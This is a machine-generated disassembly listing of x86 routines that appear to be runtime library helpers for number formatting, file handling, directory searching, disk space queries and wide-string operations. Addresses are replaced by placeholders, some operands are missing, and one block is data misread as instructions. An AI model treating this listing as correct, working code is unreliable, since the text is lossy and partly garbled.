sub ecx esi
shr ecx 0x1
or edx edx
js r-xdata
retn
sub edx ecx
jbe r-xdata
sub esi edx
mov ax 0x30
sub esi edx
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ esi + edx * 2 ] ax
mov [ esi ] ax
sub_411a54
or cl cl
jne sub_411a88
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_411a88
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_411a88
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_411a88
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_411b20
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_411a54
mov edx esi
pop eax
call sub_4071d4
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_411b48
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_411868
mov edx esi
pop eax
call sub_4071d4
add esp 0x20
pop esi
retn
xor edx edx
sub_411b70
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_404de0
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0x11
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_410c44
sub_411bc4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_404de0
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_411be4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4083dc
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_411c04
mov eax [ rw-data ]
call sub_408754
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_408754
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_4070a8
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_4070a8
sub_411ca4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edi [ eax - 0x4 ]
mov eax [ ebx ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x10 ]
call sub_411254
test eax eax
sete al
test al al
je r-xdata
sub_411cf4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4137ac
mov edx eax
test dl dl
je r-xdata
call sub_411c04
push ebp
mov eax [ rw-data ]
call sub_40875c
mov edx eax
mov eax [ rw-data ]
call sub_411ca4
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_40875c
mov edx eax
mov eax [ rw-data ]
call sub_411ca4
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_411d9c
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_4070a8
call sub_411c04
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4070a8
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4070a8
jmp r-xdata
pop esi
pop ebx
retn
sub_411dec
push cs
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
dec [ ebx + 0x68da8bf0 ]
add [ eax + eax ] al
add [ ebp + 0x50042444 ] cl
popad
je r-xdata
pop esi
pop ebx
retn
mov [ ebx - 0x1 ] edx
inc [ ebx + 0xf00047b ]
xchg esp eax
rol [ ecx + 0x800c4 ] 0x0
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
inc eax
adc al [ eax ]
add al 0x0
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40 ] bl
add [ eax ] al
add al [ 0x6e656449 ]
je r-xdata
adc al [ eax ]
add al 0x0
add [ eax ] al
add al [ ebx ]
push ebx
je r-xdata
add [ eax + 0x12 ] al
inc eax
add [ eax + eax ] al
shr al cl
pop ebx
push edx
mov eax [ ebx ]
push eax
push esi
call LoadStringW
mov ecx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4071e4
cmp [ ebx + 0x4 ] 0x0
sete al
add esp 0x800
add al [ eax ]
add al [ eax ]
lea eax [ eax ]
push ebx
push esi
add esp 0xfffff800
mov esi eax
mov ebx edx
push 0x400
lea eax [ esp + 0x4 ]
push eax
sub_411e6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_407d18
xor eax eax
push ebp
push sub_411ed4
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4070fc
lea edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_409b10
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4070a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411edb
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_407df0
retn
sub_411ef8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_407134
push eax
call CreateFileW
sub_411f50
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0xf0
cmp esi 0x40
ja r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x80
push 0x2
push 0x0
shr esi 0x4
mov eax [ esi * 4 + rw-data ]
push eax
push 0xc0000000
mov eax edi
call sub_407134
push eax
call CreateFileW
sub_411f94
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_411fc0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_411fec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call GetLastError
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
sub_41203c
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
mov ebx eax
lea eax [ ebp - 0x250 ]
push eax
mov eax ebx
call sub_407134
push eax
call FindFirstFileW
cmp eax 0xffffffff
je r-xdata
xor eax eax
push eax
call FindClose
test [ ebp - 0x250 ] 0x10
sete al
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_41207c
push ebx
push esi
mov esi eax
mov eax esi
call sub_407134
push eax
call GetFileAttributesW
cmp eax 0xffffffff
je r-xdata
call GetLastError
mov ebx eax
cmp ebx 0x2
je r-xdata
test al 0x10
sete al
pop esi
pop ebx
retn
xor eax eax
jmp r-xdata
cmp ebx 0x3
je r-xdata
pop esi
pop ebx
retn
cmp ebx 0x7b
je r-xdata
mov eax esi
call sub_41203c
test al al
jne r-xdata
mov al 0x1
sub_4120c4
push ebx
mov ebx eax
mov eax ebx
call sub_407134
push eax
call GetFileAttributesW
cmp eax 0xffffffff
je r-xdata
xor eax eax
pop ebx
retn
test al 0x10
jne r-xdata
mov al 0x1
pop ebx
retn
sub_4120e8
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
push edi
mov eax esi
call sub_407134
push eax
call SetFileAttributesW
test eax eax
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
call GetLastError
mov ebx eax
sub_412110
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x20 ]
and eax [ ebx + 0x18 ]
jne r-xdata
lea eax [ ebx + 0x20 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
call FindNextFileW
test eax eax
jne r-xdata
push esp
lea eax [ ebx + 0x34 ]
push eax
call FileTimeToLocalFileTime
push ebx
lea eax [ ebx + 0x2 ]
push eax
lea eax [ esp + 0x8 ]
push eax
call FileTimeToDosDateTime
mov eax [ ebx + 0x40 ]
xor edx edx
push edx
push eax
mov eax [ ebx + 0x3c ]
xor edx edx
mov edx eax
xor eax eax
or eax [ esp ]
or edx [ esp + 0x4 ]
add esp 0x8
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
mov eax [ ebx + 0x20 ]
mov [ ebx + 0x10 ] eax
lea eax [ ebx + 0x14 ]
lea edx [ ebx + 0x4c ]
mov ecx 0x104
call sub_407290
xor esi esi
call GetLastError
mov esi eax
jmp r-xdata
mov eax esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_412194
push ebx
push esi
push edi
mov ebx ecx
mov edi eax
not edx
and edx 0x16
mov [ ebx + 0x18 ] edx
lea eax [ ebx + 0x20 ]
push eax
mov eax edi
call sub_407134
push eax
call FindFirstFileW
mov esi eax
mov [ ebx + 0x1c ] esi
cmp esi 0xffffffff
je r-xdata
call GetLastError
mov esi eax
mov eax ebx
call sub_412110
mov esi eax
test esi esi
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_412208
jmp r-xdata
sub_4121e4
push ebx
mov ebx eax
lea eax [ ebx + 0x20 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
call FindNextFileW
test eax eax
je r-xdata
call GetLastError
pop ebx
retn
mov eax ebx
call sub_412110
pop ebx
retn
sub_412224
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4122b3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor ebx ebx
jmp r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4122ba
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov edx [ ebp - 0x4 ]
lea ebx [ edx + eax * 2 - 0x2 ]
dec eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
cmp [ ebx ] 0xdc00
jb r-xdata
cmp [ ebx ] 0xdfff
ja r-xdata
cmp [ ebx - 0x2 ] 0xd800
jb r-xdata
cmp [ ebx - 0x2 ] 0xdbff
ja r-xdata
sub ebx 0x2
sub_4122c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_41238c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov esi eax
mov eax ebx
call sub_407134
mov [ ebp - 0x8 ] eax
test esi esi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412393
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
cmp [ ebx + esi * 2 - 0x2 ] 0x0
je r-xdata
mov eax ebx
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
dec esi
test esi esi
jg r-xdata
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov ebx eax
movzx edx [ edi + esi * 2 - 0x2 ]
mov eax [ ebp - 0x8 ]
call sub_41279c
test eax eax
jne r-xdata
mov eax edi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov edi eax
sub_41239c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_4122c0
mov esi eax
push edi
mov ecx esi
mov edx 0x1
mov eax ebx
call sub_4077d0
pop edi
pop esi
pop ebx
retn
sub_4123d8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_4122c0
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_4077d0
pop edi
pop esi
pop ebx
retn
sub_412418
push ebx
push esi
push edi
push ebp
add esp 0xfffffdf0
mov esi edx
mov edi eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax edi
call sub_407134
mov ebp eax
push ebp
call GetFullPathNameW
mov ebx eax
cmp ebx 0x104
jg r-xdata
test ebx ebx
jle r-xdata
lea edx [ esp + 0x4 ]
mov eax esi
mov ecx ebx
call sub_4071e4
jmp r-xdata
add esp 0x210
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx ebx
call sub_40740c
push esp
mov eax [ esi ]
call sub_407134
push eax
push ebx
push ebp
call GetFullPathNameW
mov ebx eax
mov eax [ esi ]
mov [ esp + 0x20c ] eax
mov eax [ esp + 0x20c ]
test eax eax
je r-xdata
cmp eax ebx
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax esi
mov edx ebx
call sub_40740c
sub_4124ac
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceW
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_4082a8
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_4082a8
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_412520
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
mov edx eax
neg edx
add eax 0x1
and eax 0xfffffffe
mov cx [ eax ]
add eax 0x2
test cl ch
jne r-xdata
test cl cl
je r-xdata
lea eax [ edx + eax - 0x2 ]
retn
test ch ch
jne r-xdata
lea eax [ edx + eax - 0x1 ]
retn
sub_412550
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
mov edx eax
neg edx
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
lea eax [ edx + eax - 0x2 ]
shr eax 0x1
retn
sub_41259c
sub edx eax
test eax 0x3
push eax
je r-xdata
movzx ecx [ edx + eax ]
test ecx ecx
je r-xdata
movzx ecx [ edx + eax ]
mov [ eax ] cx
test ecx ecx
je r-xdata
mov [ eax ] cx
pop eax
retn
mov ecx [ edx + eax ]
mov [ eax ] ecx
add eax 0x4
cmp ecx 0xffff
ja r-xdata
pop eax
retn
add eax 0x2
sub_4125d4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
mov [ esp ] esi
mov eax edi
call sub_412550
mov ebx eax
cmp ebp ebx
jae r-xdata
mov ecx ebx
add ecx ecx
mov edx esi
mov eax edi
call sub_4043c8
mov [ esi + ebx * 2 ] 0x0
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx ebp
sub_412610
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_412684
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_407134
mov edx eax
mov ecx ebx
mov eax esi
call sub_4125d4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41268b
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_412694
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_407134
mov edx eax
mov ecx edi
mov eax ebx
call sub_4125d4
pop edi
pop esi
pop ebx
retn
sub_4126b4
push esi
push edi
mov ecx eax
mov esi edx
movzx edi ax
movzx eax dx
sub edi eax
jmp r-xdata
test ax ax
jne r-xdata
mov eax edi
pop edi
pop esi
retn
add ecx 0x2
add esi 0x2
jmp r-xdata
movzx eax [ ecx ]
movzx edx [ esi ]
cmp dx ax
jne r-xdata
sub_4126e4
push esi
push edi
add esp 0xfffffff8
mov [ esp ] ecx
mov esi eax
mov edi edx
xor ecx ecx
cmp ecx [ esp ]
jae r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
movzx eax [ esi ]
movzx edx [ edi ]
cmp dx ax
jne r-xdata
movzx eax ax
movzx edx dx
sub eax edx
mov [ esp + 0x4 ] eax
jmp r-xdata
test ax ax
jne r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop edi
pop esi
retn
add esi 0x2
add edi 0x2
inc ecx
cmp ecx [ esp ]
jb r-xdata
sub_412730
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] ecx
mov esi eax
mov edi edx
xor ecx ecx
cmp ecx [ esp ]
jae r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
movzx eax [ esi ]
movzx edx [ edi ]
mov ebx eax
add ebx 0xffffff9f
sub bx 0x1a
jae r-xdata
mov ebx edx
add ebx 0xffffff9f
sub bx 0x1a
jae r-xdata
xor ax 0x20
cmp dx ax
jne r-xdata
xor dx 0x20
movzx eax ax
movzx edx dx
sub eax edx
mov [ esp + 0x4 ] eax
jmp r-xdata
test ax ax
jne r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
add esi 0x2
add edi 0x2
inc ecx
cmp ecx [ esp ]
jb r-xdata
sub_4127b8
push esi
test dx dx
jne r-xdata
xor esi esi
jmp r-xdata
call sub_412570
mov esi eax
jmp r-xdata
movzx ecx [ eax ]
cmp dx cx
jne r-xdata
mov eax esi
pop esi
retn
test cx cx
je r-xdata
mov esi eax
add eax 0x2
jmp r-xdata
add eax 0x2
sub_4127e8
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor ax ax
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsw [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x2 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_412840
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edi ecx
sub edi [ ebp + 0x8 ]
test edi edi
jl r-xdata
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax ebx
add eax eax
add eax esi
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4126e4
test eax eax
jne r-xdata
cmp [ esi + ebx * 2 ] 0x0
je r-xdata
mov eax ebx
add eax eax
add eax esi
mov [ ebp - 0x8 ] eax
jmp r-xdata
sub_4128cc
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_412550
mov esi eax
inc esi
mov eax esi
call sub_4128a0
mov ecx esi
mov edx ebx
call sub_41258c
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_412908
push ebx
push esi
add esp 0xffffffb8
mov ebx ecx
mov esi eax
cmp ebx 0x1f
jbe r-xdata
mov eax esp
mov ecx ebx
call sub_41258c
mov [ esp + ebx * 2 ] 0x0
mov eax esp
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] 0xa
lea edx [ esp + 0x40 ]
mov eax [ esi * 4 + rw-data ]
xor ecx ecx
call sub_410c44
add esp 0x48
pop esi
pop ebx
retn
mov ebx 0x1f
sub_412950
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_412c60
pop ebx
pop ebp
retn 0xc
sub_41296c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_412550
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_412c60
mov [ ebx + eax * 2 ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4129b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_412550
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_412c60
mov [ ebx + eax * 2 ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412a08
push ebp
mov ebp esp
push eax
mov eax 0x2
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_412b8e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp eax 0xc00
jge r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
mov [ ebp - 0x14 ] ebx
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x2014 ]
mov edx 0xfff
call sub_412950
mov [ ebp - 0x14 ] eax
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
lea edx [ ebp - 0x2014 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x14 ]
call sub_4071e4
jmp r-xdata
mov eax ebx
dec eax
cmp eax [ ebp - 0x14 ]
jg r-xdata
mov eax ebx
dec eax
cmp eax [ ebp - 0x14 ]
jle r-xdata
add ebx ebx
mov eax [ ebp - 0x8 ]
xor edx edx
call sub_4070a8
mov eax [ ebp - 0x8 ]
mov edx ebx
call sub_40740c
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_40740c
jmp r-xdata
mov edi esi
test edi edi
je r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412b95
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
push edi
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_407134
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
call sub_412950
mov [ ebp - 0x14 ] eax
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov esi eax
sub_412ba0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_412c10
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_40703c
lea eax [ ebp - 0x4 ]
mov ecx ebx
mov edx edi
call sub_406e64
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4072f8
mov eax [ ebp - 0x8 ]
call sub_407134
mov edx eax
mov ecx ebx
mov eax esi
call sub_412908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412c17
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call sub_406d54
